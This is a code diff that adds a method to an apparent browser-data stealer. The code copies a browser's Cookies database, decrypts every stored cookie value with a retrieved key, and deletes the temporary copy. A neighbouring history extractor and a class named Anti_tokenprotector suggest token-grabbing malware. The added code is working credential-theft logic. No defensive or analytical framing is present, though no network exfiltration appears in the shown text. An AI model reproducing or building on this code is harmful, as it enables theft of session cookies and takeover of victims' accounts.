@@ -110,6 +110,30 @@ class Extract:
         except: pass
 
         return history
+    
+    def extractCookies(self, browserPath: str):
+        cookies = {}
+        tempfile = utils.random_string.get(10)
+        if os.path.exists(os.path.join(browserPath, "Network")):
+            cookiesPath = os.path.join(browserPath, "Network", "Cookies")
+        else:
+            cookiesPath = os.path.join(browserPath, "Cookies")
+
+        shutil.copy(cookiesPath, tempfile)
+        db = sqlite3.connect(tempfile)
+        cursor = db.cursor()
+        cursor.execute("select host_key, name, encrypted_value from cookies")
+
+        for row in cursor.fetchall():
+            cookies[row[0]] = {row[1]: self.decryption(row[2], self.key)}
+
+        cursor.close()
+        db.close()
+       
+        try: os.remove(tempfile)
+        except: pass
+
+        return cookies
 
 
 class Anti_tokenprotector:
